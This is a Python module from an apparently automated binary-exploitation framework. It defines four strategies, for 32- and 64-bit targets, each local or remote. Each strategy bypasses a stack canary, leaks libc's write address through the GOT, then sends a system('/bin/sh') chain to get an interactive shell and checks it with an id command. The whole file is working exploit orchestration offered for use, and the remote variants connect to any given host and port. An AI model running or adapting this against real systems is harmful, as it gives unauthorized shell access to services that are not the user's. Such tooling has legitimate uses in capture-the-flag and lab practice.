"""P7.10 canary_ret2libc_write — 2-stage ret2libc-write with canary bypass.

Mirrors v3.1 ``ret2libc_write_canary_x32`` (L2483-2538) +
``ret2libc_write_canary_x64`` (L2540-2638) + remote variants
(L2746, L2805), with v3.1 inline canary leak replaced by
``ctx.canary`` (P5.3 output).

2-stage flow (vs P7.10 canary_ret2libc_put):
  1. Stage 1 (leak): send ``padding + canary + filler +
     write_plt + main + 1 + write_got + 4`` (x32) — the
     binary's main calls ``write(1, write@GOT, 4)`` which
     prints 4 raw bytes containing the runtime address of
     libc's write.  Return to main for stage 2.
  2. Parse leak: ``u32(io.recv(4))`` (x32) /
     ``u64(io.recv(6).ljust(8))`` (x64).
  3. Stage 2: send ``padding + canary + filler + system + 0
     + sh`` (x32) or ``pop_rdi + sh + ret + system`` (x64).
  4. Shell: ``io.interactive()``.

Per ``rebuild.md`` §6.8 P7.10.
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import print_critical, print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.registry import register
from autopwn.exp.strategies._canary_base import CanaryStrategy
from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32, Ret2LibcWriteX64
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


@register
class CanaryRet2LibcWriteX32LocalStrategy(CanaryStrategy):
    """Canary-tainted x32 2-stage ret2libc-write — local."""

    name = "canary-ret2libc-write-x32"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = False
    requires = ("padding", "has_write", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        primitive = Ret2LibcWriteX32()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-write-x32 stage1: primitive returned empty; skipping")
            return False

        from pwn import process, u32

        print_section_header("EXPLOITATION: canary ret2libc-write - x32 Local")
        print_payload("preparing canary + write leak payload")

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            write_addr = u32(io.recv(4))
        except Exception as e:
            print_info(f"canary-ret2libc-write-x32 leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            print_info("canary-ret2libc-write-x32 stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))

        info = ExploitInfo(
            exploit_type="canary ret2libc-write - x32",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2LibcWriteX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


@register
class CanaryRet2LibcWriteX32RemoteStrategy(CanaryStrategy):
    """Canary-tainted x32 2-stage ret2libc-write — remote."""

    name = "canary-ret2libc-write-x32-remote"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = True
    requires = ("padding", "has_write", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.remote is None:
            print_info("canary-ret2libc-write-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        primitive = Ret2LibcWriteX32()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-write-x32-remote stage1: primitive returned empty; skipping")
            return False

        from pwn import remote as pwn_remote, u32

        print_section_header("EXPLOITATION: canary ret2libc-write - x32 Remote")
        print_payload("preparing remote canary + write leak payload")

        io = pwn_remote(host, port)
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            write_addr = u32(io.recv(4))
        except Exception as e:
            print_info(f"canary-ret2libc-write-x32-remote leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            print_info("canary-ret2libc-write-x32-remote stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))

        info = ExploitInfo(
            exploit_type="canary ret2libc-write - x32 Remote",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2LibcWriteX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


@register
class CanaryRet2LibcWriteX64LocalStrategy(CanaryStrategy):
    """Canary-tainted x64 2-stage ret2libc-write — local."""

    name = "canary-ret2libc-write-x64"
    priority = CanaryStrategy.priority
    requires_arch = 64
    requires_remote = False
    requires = ("padding", "has_write", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        primitive = Ret2LibcWriteX64()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-write-x64 stage1: primitive returned empty; skipping")
            return False

        from pwn import process, u64

        print_section_header("EXPLOITATION: canary ret2libc-write - x64 Local")
        print_payload("preparing canary + write leak payload (x64)")

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            write_addr = u64(io.recv(6).ljust(8, b"\x00"))
        except Exception as e:
            print_info(f"canary-ret2libc-write-x64 leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            print_info("canary-ret2libc-write-x64 stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))

        info = ExploitInfo(
            exploit_type="canary ret2libc-write - x64",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2LibcWriteX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


@register
class CanaryRet2LibcWriteX64RemoteStrategy(CanaryStrategy):
    """Canary-tainted x64 2-stage ret2libc-write — remote."""

    name = "canary-ret2libc-write-x64-remote"
    priority = CanaryStrategy.priority
    requires_arch = 64
    requires_remote = True
    requires = ("padding", "has_write", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.remote is None:
            print_info("canary-ret2libc-write-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        primitive = Ret2LibcWriteX64()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-write-x64-remote stage1: primitive returned empty; skipping")
            return False

        from pwn import remote as pwn_remote, u64

        print_section_header("EXPLOITATION: canary ret2libc-write - x64 Remote")
        print_payload("preparing remote canary + write leak payload (x64)")

        io = pwn_remote(host, port)
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            write_addr = u64(io.recv(6).ljust(8, b"\x00"))
        except Exception as e:
            print_info(f"canary-ret2libc-write-x64-remote leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            print_info("canary-ret2libc-write-x64-remote stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))

        info = ExploitInfo(
            exploit_type="canary ret2libc-write - x64 Remote",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2LibcWriteX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


__all__ = [
    "CanaryRet2LibcWriteX32LocalStrategy",
    "CanaryRet2LibcWriteX32RemoteStrategy",
    "CanaryRet2LibcWriteX64LocalStrategy",
    "CanaryRet2LibcWriteX64RemoteStrategy",
]
